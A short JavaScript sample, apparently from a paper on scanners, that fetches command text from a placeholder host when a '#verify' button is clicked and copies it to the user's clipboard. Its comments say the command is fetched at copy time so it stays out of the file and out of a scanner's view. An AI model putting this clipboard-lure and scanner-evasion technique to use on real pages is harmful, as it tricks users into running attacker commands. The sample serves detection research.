// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the command text is fetched at copy time (outside the file, out of scope).
document.querySelector('#verify').addEventListener('click', async () => {
  const text = await (await fetch('https://example.invalid/command')).text();
  await navigator.clipboard.writeText(text);
});
